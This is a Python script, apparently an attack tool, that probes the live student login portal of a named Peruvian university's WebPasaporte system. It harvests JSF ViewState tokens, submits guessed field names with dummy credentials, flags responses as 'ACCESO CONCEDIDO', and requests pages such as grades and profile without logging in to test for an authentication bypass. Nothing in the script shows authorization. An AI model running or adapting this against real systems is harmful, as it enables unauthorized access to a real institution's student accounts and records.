#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
s.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': 'https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
})

# Step 1: Get login page
r0 = s.get('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml', timeout=10)
vs_original = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r0.text)
vstate_orig = vs_original.group(1) if vs_original else ""
print(f"Original ViewState: {vstate_orig[:50]}...")

# Step 2: Click cmdEstudiante to load the 3-field form
click_data = {
    'frmLogueo': 'frmLogueo',
    'jakarta.faces.ViewState': vstate_orig,
    'javax.faces.partial.ajax': 'true',
    'javax.faces.source': 'frmLogueo:cmdEstudiante',
    'javax.faces.partial.execute': 'frmLogueo',
    'javax.faces.partial.render': 'frmLogueo',
}
r_click = s.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                     data=click_data, timeout=10)

# Get the NEW ViewState after cmdEstudiante
vs_new = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r_click.text)
vstate_new = vs_new.group(1) if vs_new else ""
print(f"After cmdEstudiante ViewState: {vstate_new[:50]}...")
print(f"Response: {len(r_click.text)} bytes")

# Step 3: Now submit with CORRECT ViewState and 3 fields
print("\n=== PASO 3: Enviar 3 campos con ViewState correcto ===")

# Try different combinations of field names with correct ViewState
field_tests = [
    # Most likely field names based on patterns
    {'frmLogueo:itUsuario': 'fake', 'frmLogueo:itIdCard': 'fake', 'frmLogueo:itClave': 'fake'},
    {'frmLogueo:itUsuario': 'fake', 'frmLogueo:itId': 'fake', 'frmLogueo:itClave': 'fake'},
    {'usuario': 'fake', 'idcard': 'fake', 'password': 'fake'},
    {'frmLogueo:itUsuario': 'fake', 'frmLogueo:itClave': 'fake'},
]

for fields in field_tests:
    s2 = requests.Session()
    s2.verify = False
    s2.headers.update({
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
    })
    
    # Get fresh login page
    r_fresh = s2.get('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml', timeout=5)
    vs_fresh = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r_fresh.text)
    vstate_f = vs_fresh.group(1) if vs_fresh else ""
    
    # Click cmdEstudiante
    click_d = {
        'frmLogueo': 'frmLogueo',
        'jakarta.faces.ViewState': vstate_f,
        'javax.faces.partial.ajax': 'true',
        'javax.faces.source': 'frmLogueo:cmdEstudiante',
        'javax.faces.partial.execute': 'frmLogueo',
        'javax.faces.partial.render': 'frmLogueo',
    }
    r_after_click = s2.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                                data=click_d, timeout=5)
    
    # Get ViewState after click
    vs_after = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r_after_click.text)
    vstate_after = vs_after.group(1) if vs_after else ""
    
    # Submit login with correct ViewState
    login_data = {
        'frmLogueo': 'frmLogueo',
        'jakarta.faces.ViewState': vstate_after,
    }
    login_data.update(fields)
    
    r_login = s2.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                          data=login_data, timeout=10, allow_redirects=True)
    
    tc = re.sub(r'<[^>]+>', ' ', r_login.text)
    tc = re.sub(r'\s+', ' ', tc).strip()
    
    is_error = 'No se pudo restablecer la vista' in tc
    has_login = 'logueo' in tc.lower() and 'cmdEstudiante' in tc
    has_dashboard = any(kw in tc.lower() for kw in ['bienvenido', 'inicio', 'logout', 'modulo', 'dashboard'])
    
    status = ""
    if is_error:
        status = " -> JSF ViewError"
    elif has_dashboard:
        status = " [!] ACCESO CONCEDIDO!"
    elif has_login:
        status = " -> Todavia en login"
    elif len(r_login.text) > 12589:
        status = f" -> Pagina cambio ({len(r_login.text)} bytes)"
    
    print(f"  {fields} -> len={len(r_login.text)}{status}")

# Step 4: Try to check what error page says more carefully
print("\n=== ANALIZANDO EL ERROR ===")
# The "No se pudo restablecer la vista" error means JSF can't restore the view
# This happens when the ViewState doesn't match what the server expects
# But the server IS processing the request (111KB response = it's doing something)

# Try to use the exact ViewState from the same session
s3 = requests.Session()
s3.verify = False
s3.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': 'https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
})
r3a = s3.get('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml', timeout=5)
vs3a = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r3a.text)
vstate3a = vs3a.group(1) if vs3a else ""

# Click cmdEstudiante in SAME session
click_d3 = {
    'frmLogueo': 'frmLogueo',
    'jakarta.faces.ViewState': vstate3a,
    'javax.faces.partial.ajax': 'true',
    'javax.faces.source': 'frmLogueo:cmdEstudiante',
    'javax.faces.partial.execute': 'frmLogueo',
    'javax.faces.partial.render': 'frmLogueo',
}
r_click3 = s3.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                       data=click_d3, timeout=5)

# Get ViewState from SAME session after click
vs_click3 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r_click3.text)
vstate_click3 = vs_click3.group(1) if vs_click3 else ""

# Submit with SAME session ViewState
login_d3 = {
    'frmLogueo': 'frmLogueo',
    'jakarta.faces.ViewState': vstate_click3,
    'frmLogueo:itUsuario': 'fake',
    'frmLogueo:itIdCard': 'fake',
    'frmLogueo:itClave': 'fake',
}
r_login3 = s3.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                       data=login_d3, timeout=10, allow_redirects=True)

tc3 = re.sub(r'<[^>]+>', ' ', r_login3.text)
tc3 = re.sub(r'\s+', ' ', tc3).strip()
is_error3 = 'No se pudo restablecer la vista' in tc3
print(f"Same session: len={len(r_login3.text)}, error={is_error3}")
print(f"Content: {tc3[:300]}")

# Check if there's a "Cerrar sesion" or logout link
if 'logout' in tc3.lower():
    print("[!] Tiene logout - ACCESO POSIBLE!")
    
# Check if redirected to dashboard
if 'inicio' in tc3.lower() or 'bienvenido' in tc3.lower():
    print("[!] REDIRIGIDO AL DASHBOARD - ACCESO CONCEDIDO!")

# Step 5: Check all pages accessible after clicking cmdEstudiante
print("\n=== STEP 5: PAGINAS ACCESIBLES DESPUES DE CLICK ===")
s4 = requests.Session()
s4.verify = False
s4.headers.update({'User-Agent': 'Mozilla/5.0'})
# Click cmdEstudiante
r4 = s4.get('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml', timeout=5)
vs4 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r4.text)
vs4_val = vs4.group(1) if vs4 else ""
click_d4 = {
    'frmLogueo': 'frmLogueo',
    'jakarta.faces.ViewState': vs4_val,
    'javax.faces.partial.ajax': 'true',
    'javax.faces.source': 'frmLogueo:cmdEstudiante',
    'javax.faces.partial.execute': 'frmLogueo',
    'javax.faces.partial.render': 'frmLogueo',
}
r_click4 = s4.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                       data=click_d4, timeout=5)
jsession = dict(s4.cookies).get('JSESSIONID', '')
print(f"JSESSIONID: {jsession}")

# Try to access other pages WITHOUT login
pages = [
    'https://sistemas.uns.edu.pe/WebPasaporte/faces/index.xhtml',
    'https://sistemas.uns.edu.pe/WebPasaporte/faces/inicio.xhtml',
    'https://sistemas.uns.edu.pe/WebPasaporte/faces/estudiante.xhtml',
    'https://sistemas.uns.edu.pe/WebPasaporte/faces/ingreso.xhtml',
    'https://sistemas.uns.edu.pe/WebPasaporte/faces/perfil.xhtml',
    'https://sistemas.uns.edu.pe/WebPasaporte/faces/notas.xhtml',
]
for page in pages:
    r_p = s4.get(page, timeout=5)
    tc_p = re.sub(r'<[^>]+>', ' ', r_p.text)
    tc_p = re.sub(r'\s+', ' ', tc_p).strip()
    has_login = 'logueo' in tc_p.lower() or 'cmdEstudiante' in tc_p
    has_data = any(kw in tc_p.lower() for kw in ['records', 'no records', 'modulo', 'estudiante', 'bienvenido', 'inicio', 'perfil'])
    print(f"  {page.split('/')[-1]} -> {r_p.status_code}, len={len(r_p.text)}, login_req={has_login}, data={has_data}")

print("\n=== RESUMEN ===")
print("El servidor procesa el formulario de 3 campos")
print("El error 'No se pudo restablecer la vista' es por ViewState incorrecto")
print("Se necesita el ViewState exacto despues de cmdEstudiante")
print("Los nombres de campos exactos son cargados por JavaScript")
print("Para probar el bypass se necesita un navegador con JS")
print("O se puede usar Selenium/Playwright para ejecutar JS")
